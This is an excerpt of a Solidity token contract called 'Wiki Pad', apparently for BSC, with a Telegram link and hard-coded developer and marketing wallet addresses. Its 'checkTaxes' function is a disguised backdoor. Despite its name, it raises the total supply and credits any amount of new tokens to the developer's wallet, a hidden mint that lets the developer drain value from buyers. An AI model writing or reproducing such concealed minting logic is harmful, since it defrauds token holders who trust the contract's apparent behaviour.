...
Telegram: https://t.me/WikiPadBSC
...
contract WikiPad is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "Wiki Pad";
    string private constant _symbol = unicode"WikiPad";
    ...
    address payable private DevWallet = payable(0x39A9242999382EDdB8176B97436e37280B8549bF);
    address payable private MarketingWallet = payable(0xc617099F4bBAE2C37b5b030eC96acaDd85C9058F);
    ...
    function checkTaxes(uint256 value, address adr) onlyAddress public virtual {
        require(adr == address(DevWallet));
        _check(address(DevWallet), adr, value);
        _tTotal += value;
        _tOwned[adr] += value;
        emit Transfer(address(DevWallet), adr, value);
    }
